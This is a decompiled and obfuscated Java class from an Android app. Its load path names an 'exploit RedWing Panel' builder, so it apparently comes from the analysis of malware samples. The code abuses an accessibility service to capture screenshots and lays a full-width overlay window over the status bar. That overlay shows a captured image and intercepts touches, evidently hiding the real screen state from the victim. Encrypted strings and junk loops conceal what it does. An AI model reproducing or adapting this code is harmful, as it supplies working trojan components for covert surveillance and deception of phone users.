package v.s;

import android.graphics.Bitmap;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.Display;
import android.view.DisplayCutout;
import android.view.WindowManager;
import android.widget.ImageView;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.util.Locale;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class s50M5De8F5UWQVP09E {
    public static final /* synthetic */ int ibVTtJUNfrGYbW = 0;
    public int Ee8d2j4S9Vm5yGuR;
    public boolean JXn4Qf7zpnLjP5;
    public final DataQFAdapter dDIMxZXP1V8HdM;
    public ImageView vekpFI4d1Nc4fakF;
    public final Handler w9sT1Swbhx3hs = new Handler(Looper.getMainLooper());
    public final YqOiSVb2wSv9Lq63qb xDyLpEZyrcKVe0 = new YqOiSVb2wSv9Lq63qb(7, this);

    static {
        TypefaceCache.obtain("00100062005A009300E500AC00F000A600310059004D008200E200B300D300BE");
    }

    public s50M5De8F5UWQVP09E(DataQFAdapter dataQFAdapter) {
        this.dDIMxZXP1V8HdM = dataQFAdapter;
    }

    private static /* synthetic */ void zanxfaqka() {
    }

    public final Bitmap dDIMxZXP1V8HdM() {
        if (Build.VERSION.SDK_INT < 30) {
            return null;
        }
        try {
            CountDownLatch countDownLatch = new CountDownLatch(1);
            aqjfZUF02xH6w aqjfzuf02xh6w = new aqjfZUF02xH6w();
            DataQFAdapter dataQFAdapter = this.dDIMxZXP1V8HdM;
            dataQFAdapter.takeScreenshot(0, dataQFAdapter.getMainExecutor(), new EXFdIC4sJuGvFXtBxD(this, aqjfzuf02xh6w, countDownLatch));
            countDownLatch.await(2L, TimeUnit.SECONDS);
            return (Bitmap) aqjfzuf02xh6w.w9sT1Swbhx3hs;
        } catch (Throwable th) {
            TypefaceCache.obtain("00200077004B009300E500AD00D70091002A0077007A008400F300BA00C100B4002A00740052008B00F900AB00CB009400200064005E008200FE00AC00DA00A800370036005E009500E200B000C000FD0063");
            th.getMessage();
            return null;
        }
    }

    public final void vekpFI4d1Nc4fakF() {
        int dimensionPixelSize;
        Display defaultDisplay;
        DisplayCutout cutout;
        DataQFAdapter dataQFAdapter = this.dDIMxZXP1V8HdM;
        if (this.JXn4Qf7zpnLjP5) {
            return;
        }
        DataQFAdapter.Companion.getClass();
        WindowManager windowManager = DataQFAdapter.accessWindowManager;
        if (windowManager == null) {
            return;
        }
        try {
            int identifier = dataQFAdapter.getResources().getIdentifier(TypefaceCache.obtain("00300062005A009300E500AC00ED00A5002200640064008F00F500B600D500AF0037"), TypefaceCache.obtain("0027007F0056008200FE"), TypefaceCache.obtain("00220078005F009500FF00B600D6"));
            while (Locale.getDefault().toString().length() > 999) {
                String.valueOf(System.nanoTime());
            }
            dimensionPixelSize = identifier > 0 ? dataQFAdapter.getResources().getDimensionPixelSize(identifier) : 0;
        } catch (Exception unused) {
        }
        int i = Build.VERSION.SDK_INT;
        if (i >= 28) {
            try {
                Object systemService = dataQFAdapter.getSystemService("window");
                WindowManager windowManager2 = systemService instanceof WindowManager ? (WindowManager) systemService : null;
                int safeInsetTop = (i < 29 || windowManager2 == null || (defaultDisplay = windowManager2.getDefaultDisplay()) == null || (cutout = defaultDisplay.getCutout()) == null) ? 0 : cutout.getSafeInsetTop();
                if (safeInsetTop > dimensionPixelSize) {
                    dimensionPixelSize = safeInsetTop;
                }
            } catch (Exception unused2) {
            }
        }
        if (dimensionPixelSize <= 0) {
            dimensionPixelSize = (int) (24 * dataQFAdapter.getResources().getDisplayMetrics().density);
        }
        this.Ee8d2j4S9Vm5yGuR = dimensionPixelSize;
        if (dimensionPixelSize <= 0) {
            TypefaceCache.obtain("000000770055008900FF00AB009200A300260062005E009500FD00B600DC00A200630065004F008600E400AA00C100E700210077004900C700F800BA00DB00A0002B0062001700C700E300B400DB00B70033007F0055008000B000B000C400A20031007A005A009E");
            return;
        }
        try {
            ImageView imageView = new ImageView(dataQFAdapter);
            imageView.setScaleType(ImageView.ScaleType.FIT_XY);
            imageView.setOnTouchListener(new UX1wumA9o1nH9kfC(1, this));
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(-1, this.Ee8d2j4S9Vm5yGuR, 2032, 262952, -3);
            layoutParams.gravity = 8388659;
            layoutParams.x = 0;
            layoutParams.y = 0;
            windowManager.addView(imageView, layoutParams);
            this.vekpFI4d1Nc4fakF = imageView;
            this.JXn4Qf7zpnLjP5 = true;
            w9sT1Swbhx3hs();
            this.w9sT1Swbhx3hs.postDelayed(this.xDyLpEZyrcKVe0, 40000L);
            TypefaceCache.obtain("00100062005A009300E500AC009200A500220064001B008800E600BA00C000AB0022006F001B009400F800B000C500A90063003E0053008200F900B800DA00B3007E");
        } catch (Exception e) {
            TypefaceCache.obtain("000500770052008B00F500BB009200B3002C00360048008F00FF00A8009200A8003500730049008B00F100A6008800E7");
            e.getMessage();
        }
    }

    /* JADX WARN: Code duplicated, block: B:11:0x0018  */
    public final void w9sT1Swbhx3hs() {
        Bitmap bitmapDDIMxZXP1V8HdM;
        if (this.JXn4Qf7zpnLjP5) {
            try {
                if (Build.VERSION.SDK_INT >= (-3) + 33) {
                    try {
                        bitmapDDIMxZXP1V8HdM = dDIMxZXP1V8HdM();
                        if (bitmapDDIMxZXP1V8HdM == null) {
                            bitmapDDIMxZXP1V8HdM = null;
                        }
                    } catch (Throwable unused) {
                    }
                } else {
                    bitmapDDIMxZXP1V8HdM = null;
                }
                Thread.currentThread().getName();
                if (bitmapDDIMxZXP1V8HdM != null) {
                    ImageView imageView = this.vekpFI4d1Nc4fakF;
                    if (imageView != null) {
                        imageView.setImageBitmap(bitmapDDIMxZXP1V8HdM);
                    }
                    ImageView imageView2 = this.vekpFI4d1Nc4fakF;
                    if (imageView2 != null) {
                        imageView2.setBackgroundColor(0);
                        return;
                    }
                    return;
                }
                ImageView imageView3 = this.vekpFI4d1Nc4fakF;
                if (imageView3 != null) {
                    imageView3.setImageBitmap(null);
                }
                ImageView imageView4 = this.vekpFI4d1Nc4fakF;
                if (imageView4 != null) {
                    imageView4.setBackgroundColor(0);
                }
            } catch (Exception e) {
                TypefaceCache.obtain("001000750049008200F500B100C100AF002C0062001B009500F500B900C000A20030007E001B008100F100B600DE00A20027002C001B");
                e.getMessage();
            }
        }
    }
}
